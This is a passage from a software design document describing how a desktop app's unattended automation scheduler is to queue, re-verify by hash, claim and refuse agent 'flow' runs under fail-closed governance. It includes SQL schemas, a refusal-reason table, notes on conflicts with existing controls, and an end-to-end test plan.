and for each due row calls `run` (`:2351`) → `execute_action` (`:2297`) → one local SQLite write
plus an `automation.ran` audit row. `implemented` ◑.

Two things about it are load-bearing for what follows. First, **the loop is safe today because of
the executor's vocabulary, not because of the loop**: three verbs exist and all three are local
writes, so there is nothing unattended that could reach outside the box. Second, **the governance
layer that exists is in the renderer and the scheduler does not call it**:
`apps/desktop/src/features/automationsGovernance.ts` builds a contract, refuses model-reaching verbs
and caps unleased runs at `LOCAL_RISK_CEILING = 'medium'` — and its own file comment states the gap
it cannot close, that `automation_runs` records *"no actor, no role, no scope, no risk, no
receipt"*. A fire leaves the same trace whether the Owner pressed the button or a timer fired at
04:00. `partial`: the contract is implemented and tested; nothing on the scheduler path consults it.

### 5.2 What changes

**`run_due` stops being the thing that executes.** It becomes a due-detector that *enqueues*, and
enqueuing is a durable row rather than a call.

```
tick (60 s)
  └─ ONE `BEGIN IMMEDIATE` transaction:
       1. find due triggers
       2. resolve trigger → agent_bundle_active.bundle_digest
       3. re-verify the bundle (§5.3)
       4. INSERT flow_runs(... state='queued')   ── or state='refused' with a typed reason
       5. INSERT scheduler_ticks(...)            ── what this tick did, always
  (the tick performs no action, reaches no network, holds no credential, calls no model)

executor (separate, not the tick)
  └─ claims one queued row:  UPDATE flow_runs SET claim_attempt_id=?, state='running'
                             WHERE id=? AND state='queued' AND claim_attempt_id IS NULL
     └─ runs the flow step by step; each `model` step is a governed turn, each `call` step
        goes through §3's enforcement point. Both are fail-closed at this head.
```

The claim shape is taken directly from migration `0013`, which already solved exactly this problem
for run steps: a one-time `execution_attempt_id` written by an `UPDATE … WHERE … IS NULL`, so a
second concurrent claim writes **0 rows and is refused before any dispatch**, plus
`execution_owner_session_id` and `execution_started_at` so a claim owned by a dead session is
reconciled fail-closed at startup (`reconcile_abandoned_executions`, called at `lib.rs:356`,
`implemented` ◑). Reusing that shape rather than inventing a second one is the recommendation, and
the reason is that it is the only concurrency control in this codebase that has already survived an
audit round.

```sql
CREATE TABLE flow_runs (
    id               TEXT PRIMARY KEY,
    bundle_id        TEXT NOT NULL,
    bundle_digest    TEXT NOT NULL REFERENCES agent_bundles(bundle_digest) ON DELETE RESTRICT,
    trigger_kind     TEXT NOT NULL,        -- 'interval' | 'manual'
    due_at           TEXT NOT NULL,
    state            TEXT NOT NULL,        -- 'queued'|'running'|'done'|'failed'|'blocked'|'refused'
    refusal_reason   TEXT,                 -- closed set; NULL unless state='refused'
    claim_attempt_id TEXT,
    claim_session_id TEXT,
    claim_started_at TEXT,
    created_at       TEXT NOT NULL
);

CREATE TABLE scheduler_ticks (
    at        TEXT PRIMARY KEY,
    due_found INTEGER NOT NULL,
    enqueued  INTEGER NOT NULL,
    refused   INTEGER NOT NULL,
    error     TEXT
);
```

`scheduler_ticks` exists because of `let _ =`. Today a poisoned mutex, a failed open or a refusal
inside `run_due` is discarded and the loop looks identical to a loop with nothing to do. **A
scheduler that cannot say what it did on a tick cannot be audited unattended**, and unattended
auditability is the entire question this section has to answer.

### 5.3 Re-verification, and why a refusal is louder than a skip

Before enqueuing, the tick recomputes `sha256(manifest.json)` and compares it with the directory
name and the `agent_bundles` row, then re-hashes every entry in the file table. A mismatch does
**not** silently skip. It writes a `flow_runs` row with `state='refused'` and
`refusal_reason='bundle_digest_mismatch'`, and moves the bundle to `retired`.

The reason is the shape of the attack. A skipped fire leaves no row, and "nothing happened" is
exactly what the log should not say when something was tampered with; it is indistinguishable from a
quiet week. A refusal leaves a row with a reason and a timestamp. This is the same principle the
existing code already applies at `repo.rs:2297`, whose own comment says *"An unrecognized verb is a
recorded 'failed' outcome, never a silent no-op."*

The tick refuses, with a typed reason from a closed set and never free text, when any of these holds
— all fail-closed, all unknown-is-refusal:

| Reason | Condition |
|---|---|
| `bundle_not_approved` | `agent_bundle_states.state != 'approved'` |
| `bundle_digest_mismatch` | manifest bytes or any file entry fails to re-hash |
| `no_active_bundle` | `agent_bundle_active` names a digest with no `agent_bundles` row |
| `grant_absent` | `grant.json` missing or empty — never read as "unrestricted" |
| `grant_expired` | `now > grant.expires_at_epoch` (§0.4.3) |
| `credential_slot_unbound` | a slot the flow requires has no row in `agent_credential_bindings` |
| `capabilities_exceed_grant` | the union of step `requires` is not a subset of the grant (§2.3.1) |
| `flow_unparseable` | `flow.json` fails strict decode |
| `already_queued` | a `queued` or `running` row exists for this bundle |

### 5.4 Why this is still safe unattended — the honest argument

Four reasons it is safe, one risk that is not designed away, and one question this document cannot
settle.

1. **The tick's own authority shrinks.** It gains the ability to write a queue row and **loses** the
   ability to perform an action. `run_due` today calls `execute_action`, which writes to
   `notifications`, `tasks` and `knowledge_notes`. After this change the tick writes to `flow_runs`
   and `scheduler_ticks` and nothing else. Strictly less, not more.
2. **Everything that could leave the box is Blocked at this head, by refusals this design does not
   touch.** A `model` step is a governed turn, and `governed_verification_unconfigured()` returns
   `Some(...)` unconditionally *before the model is invoked*; `connect_broker()` refuses off Linux;
   the broker serves `UpstreamBlockedExecutor` unless `$BROPS_BROKER_CONFIG` names a TCB-root-signed
   deployment config, which nothing in the shipped app sets. So the first end-to-end slice's correct
   result is `state='blocked'`, and a slice that returned `done` would be reporting a defect. When
   the Owner opens that gate after an independent audit, the same code path becomes live — which is
   why §0.3 is emphatic that those three refusals stay the only thing holding it.
3. **What fires is a digest a human confirmed while looking at that exact authority.** The digest
   covers `flow.json`, `grant.json` and `credentials.json` (§0.4.1), and the confirmation is the
   renderer-independent native dialog whose `confirmation_digest` is stored and compared (`T-011`,
   `implemented` ◑). That is precisely the property `automation_runs` lacks today, in its own
   module's words: no actor, no role, no scope.
4. **Concurrency is decided by a durable claim, not by the loop's timing.**
   `MissedTickBehavior::Skip` plus a slow flow has no defined behaviour today because nothing is
   queued; the `… WHERE claim_attempt_id IS NULL` claim makes a second attempt write 0 rows, and the
   `already_queued` refusal keeps a backlog from forming.

**The residual risk, named rather than dissolved: time.** One approval authorises every future tick,
and the further from the confirmation an unattended fire happens, the less that confirmation means.
The design's answer is `grant_expired` — an unattended agent stops by default rather than continues
by default — and that is why §0.4.3 places a required expiry on §3's grant. It is a bound, not a
solution: within the window, an approved agent fires with nobody present, and that is what the
customer asked for.

**What could not be settled here.** Whether a step whose `requires` includes `SPEND` should need a
per-fire approval rather than a per-version one. That is a policy decision for the Owner, not a fact
a command can settle; the experiment that would settle it is the Owner answering it. It is left open
rather than decided quietly, and until it is answered the safe default is that a flow carrying
`SPEND` cannot be enqueued unattended at all.

### 5.5 Conflicts with existing controls

> **Conflict — `LOCAL_RISK_CEILING = 'medium'` and `MODEL_REACHING_VERBS` refuse exactly what a flow
> does.** `automationsGovernance.assessRun` gives risk `high` to anything with the `reaches_model`
> factor and then refuses it as `risk_above_local_ceiling` (`implemented` ◑, with tests in both
> directions). A built agent's flow reaches a model on purpose.
> **Recommendation: leave that ceiling exactly where it is and add the flow path beside it, rather
> than raising it.** Raising it is the cheap edit and it is wrong: the ceiling guards the *unleased
> local automation* path, and widening a tested refusal to admit a new caller is how a refusal
> quietly stops refusing for the old caller too. The cost of the recommendation is a second gate to
> write and keep honest; the cost of the alternative is that `notify:`/`task:`/`note:` automations
> silently gain model reach on the day flows land.

> **Conflict — `T-022` is `Blocked`, deliberately, and this section is `T-022`.** The board reads:
> *"The governed automation dispatch. Firing an automation writes a row to the desktop store; it
> does not cross the wall … Same sequencing as `T-021`"* — and `T-021`'s sequencing is *"a new input
> to the engine's trust boundary is not added while the independent verdict is RED"*. The standing
> verdict is RED (ninth round, `apps/desktop/AUDIT/2026-08-19-ninth-audit-5cf9b8c.md`). **§5 may
> therefore be designed now and may not be implemented until that sequencing releases it.** Saying
> otherwise would route around the Owner's own ordering, which is a stop condition rather than a
> judgement call.

> **Conflict — a `run_flow` command is a new capability-manifest entry, not just a function.**
> `run_automation` is tier `X` / `allow` in `apps/desktop/src-tauri/command-policy.json`, and
> `tools/check_capabilities.py` enforces `registered == manifest == policy == grants` with "L2 must
> be protected-or-denied" (`implemented` ◑, `T-010`). Any command the flow path adds must be
> declared in all four places in the same commit, or the gate goes red. Recorded here so it is a
> planned step rather than a surprise.

> **Conflict — roadmap Phase 8's DoD says an automation needing ungoverned execution is refused at
> authoring time.** That stays true and is not weakened: a flow step is not *ungoverned*, it is
> governed and currently Blocked. The distinction is the whole of point 2 above, and Phase 8's two
> open boxes (`7/9`, board and checkboxes agreeing since `I-07`) are the same fact.

### 5.6 The smallest end-to-end slice that would prove §5

One approved bundle — the invoice chaser — with `trigger = every: 5m`. This slice is run only once
`T-022`'s sequencing releases it.

1. Let one real tick pass. Assert **exactly one** `flow_runs` row in `state='queued'` for that
   bundle, and one `scheduler_ticks` row reading `due_found=1, enqueued=1, refused=0`.
2. Let a second tick pass before the executor claims. Assert **no second row**, and a
   `scheduler_ticks` row reading `refused=1` with `already_queued`.
3. Have the executor claim it. Assert the `model` step ends `state='blocked'` carrying the governed
   refusal reason — **`blocked` is the pass condition and `done` is a defect**.
4. Race two claimers on the one queued row. Assert one `UPDATE` reports 1 row changed and the other
   reports 0, and that only one execution started.
5. Flip one byte in `prompts/classify.md`. Assert the next tick enqueues nothing, writes a
   `flow_runs` row with `refusal_reason='bundle_digest_mismatch'`, and moves the bundle to
   `retired` — and assert the row **exists**, because the failure this step is testing for is a
   silent skip.
6. Kill the process mid-step. Assert startup reconciliation settles the claim fail-closed the way
   `reconcile_abandoned_executions` already does for run steps, and that the flow does not resume on
   its own.
7. Mutate each of the six checks above once, confirm the corresponding assertion goes **red**, and
   restore it byte-exact. Three of `T-045`'s seven checks turned out to be tested by nothing, and
   the only way that was found was by deleting them.

---

## 6 · Status roll-up

| Claim | Status |
|---|---|
| `automations` is 7 columns and cannot hold an agent, a flow, a permission or a credential | `implemented` ◑ (as a limitation, measured) |
| `execute_action` supports three local verbs | `implemented` ◑ |
| No network axis in `authority-policy.json`; no capability tier carries a network tool | `implemented` ◑ |
| `USE_NETWORK` / `USE_CREDENTIAL` exist as labels; no lease can carry them | `implemented` ◑ |
| `auth_ref` is stored and validated; nothing resolves it | `implemented` ◑ |
| 60-second scheduler firing local actions and discarding its own result | `implemented` ◑ |
| Native-confirmation approval with durable origin, digest and one-time nonce | `implemented` ◑ (`T-011`) |
| Durable execution claim with fail-closed crash reconciliation | `implemented` ◑ (`0013`) |
| Content-addressed artifact store with an atomic publish algorithm | `partial` ◑ — normative in `WAVE_3B` §4.0, not in the shipped app |
| Renderer-side automation run contract | `partial` ◑ — implemented and tested; the scheduler does not call it |
| Agent bundle: manifest, file table, digest, on-disk layout | `not_implemented` |
| `agent_bundles` / `agent_bundle_states` / `agent_bundle_active` | `not_implemented` |
| Bundle approval reusing `approvals` with `entity_type='agent_bundle'` | `not_implemented` |
| `brops.agent-flow.v1`: typed steps, closed condition grammar, DAG, bounds | `not_implemented` |
| Load-time subset check of step `requires` against the grant | `not_implemented` |
| `flow_runs` queue, executor claim, `scheduler_ticks` | `not_implemented` |
| Bundle re-verification on every tick, refusal rather than skip | `not_implemented` |
| The network axis and its enforcement point | §3 — owned by the audit pack |
| Credential entry, custody, use, and rebind-requires-a-new-lease | §4 — owned by the audit pack |

---

<div align="center"><sub>menqstudio · OS · the production half · design only · governed by the wall 🧱</sub></div>
